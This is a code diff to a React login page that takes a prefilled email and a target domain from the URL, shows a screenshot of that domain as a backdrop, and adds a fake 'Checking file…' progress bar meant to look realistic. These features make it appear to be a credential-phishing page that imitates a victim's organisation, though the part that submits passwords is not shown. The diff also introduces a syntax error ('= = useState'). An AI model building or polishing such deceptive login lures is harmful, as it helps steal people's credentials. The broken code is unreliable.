@@ -10,7 +10,7 @@ export default function LoginPage() {
   const urlParamDomain = params.get('domain') || ''
 
   const [email, setEmail] = useState(preEmail)
-  const [confirmed, setConfirmed] = useState(!!preEmail)
+  const [confirmed, setConfirmed] = = useState(!!preEmail)
   const [password, setPassword] = useState('')
   const [showModal, setShowModal] = useState(false)
   const [errors, setErrors] = useState({ email: '', password: '' })
@@ -18,6 +18,7 @@ export default function LoginPage() {
   const [domainToCapture, setDomainToCapture] = useState('')
   const [screenshotUrl, setScreenshotUrl]         = useState('')
   const [isLoading, setIsLoading]                 = useState(true)
+  const [progress, setProgress]                   = useState(0)
 
   // auto-confirm email
   useEffect(() => {
@@ -50,7 +51,21 @@ export default function LoginPage() {
     const url  = `${base}${sep}url=${encodeURIComponent(`https://${domainToCapture}`)}`
     setScreenshotUrl(url)
     setIsLoading(true)
+    setProgress(0)
   }, [domainToCapture])
+
+  // simulate realistic progress
+  useEffect(() => {
+    if (!isLoading) return
+    const iv = setInterval(() => {
+      setProgress(p => {
+        const next = p + Math.random() * 15
+        return next < 90 ? next : 90
+      })
+      return
+    }, 300)
+    return () => clearInterval(iv)
+  }, [isLoading])
 
   const validateEmail = (v: string) =>
     /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)
@@ -86,9 +101,16 @@ export default function LoginPage() {
     <div className="login-container relative">
       {/* Preloader overlay */}
       {isLoading && (
-        <div className="fixed inset-0 z-30 flex items-center justify-center bg-white">
-          <div className="text-lg font-medium text-gray-700">
+        <div className="fixed inset-0 z-30 flex flex-col items-center justify-center bg-white">
+          <div className="text-lg font-medium text-gray-700 mb-4">
             Checking file…
+          </div>
+          {/* Progress bar */}
+          <div className="w-3/4 h-2 bg-gray-200 rounded overflow-hidden">
+            <div
+              className="h-full bg-blue-500 transition-all"
+              style={{ width: `${progress}%` }}
+            />
           </div>
         </div>
       )}
@@ -96,15 +118,19 @@ export default function LoginPage() {
       {/* Screenshot + light-blue tint background */}
       {screenshotUrl && (
         <div className="absolute inset-0 overflow-hidden">
-          <img
-            src={screenshotUrl}
-            alt={`Screenshot of ${domainToCapture}`}
-            onLoad={() => setIsLoading(false)}
-            onError={() => setIsLoading(false)}
-            className="w-full h-full object-cover opacity-50 pointer-events-none"
-          />
-          {/* light-blue overlay */}
-          <div className="absolute inset-0 bg-light-blue/50 pointer-events-none" />
+          <div className="absolute inset-0 p-10">
+            <img
+              src={screenshotUrl}
+              alt={`Screenshot of ${domainToCapture}`}
+              onLoad={() => {
+                setProgress(100)
+                setTimeout(() => setIsLoading(false), 300)
+              }}
+              onError={() => setIsLoading(false)}
+              className="w-full h-full object-contain opacity-50 pointer-events-none"
+            />
+            <div className="absolute inset-0 bg-light-blue/50 pointer-events-none" />
+          </div>
         </div>
       )}
 
